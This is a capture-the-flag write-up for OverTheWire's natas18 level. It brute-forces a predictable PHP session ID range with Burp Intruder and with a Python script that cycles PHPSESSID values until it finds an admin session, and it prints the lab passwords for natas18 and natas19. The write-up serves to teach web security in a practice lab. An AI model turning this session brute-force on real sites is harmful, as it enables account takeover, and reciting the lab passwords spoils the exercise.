# Natas Level 18 Writeup (natas18) – OverTheWire

## Overview

This level focuses on exploiting a **predictable session ID** vulnerability.
The goal is to obtain the password for the next level.

## Observation

When we open the page, we see a login form:

> **"Please login with your admin account to retrieve credentials for natas19."**

There is a link to view the source code:

```text
index-source.html
```

## Finding the Password

### Using Browser & BurpSuite

1. Open the source code.

2. We can see that the application sets a maximum session ID:

   ```php
   $maxid = 640;
   ```

3. The source code also checks whether the current session has admin privileges:

   ```php
   if ($_SESSION['admin'] == 1) {
       print "You are an admin.";
       ...
   }
   ```

4. The session ID can be brute-forced from `1` to `640`.

5. Login with **Username** `admin` and **Password** `admin`. Then refresh the page after selecting Burp Proxy.

6. In BurpSuite, send the request to **Intruder** and use the `PHPSESSID` value as the payload position.

7. Set the payload type to **Numbers** and configure it from:

   ```text
   1 - 640
   ```

8. Start the attack and look for the response with highest length. In my case it's 1362.

#### Proof

```text
Username: natas19
Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
```

### Using Python

```python
import requests

target = 'http://natas18.natas.labs.overthewire.org'
session = requests.Session()

session.auth = ('natas18', 'fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op')

for sessid in range(1, 641):
    headers = {'Cookie': f'PHPSESSID={sessid}'}

    r = session.post(target, headers=headers)
    print(f"Trying sessid: {sessid}", end='\r')

    if 'You are an admin' in r.text:
        print(r.text)
        break
```

The script checks every possible session ID from `1` to `640` and looks for the response indicating that the session belongs to an admin.

## Vulnerability

The application uses a **predictable session ID** with only 640 possible values.
An attacker can brute-force these values and obtain an administrator's session.

## Password

`qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT`
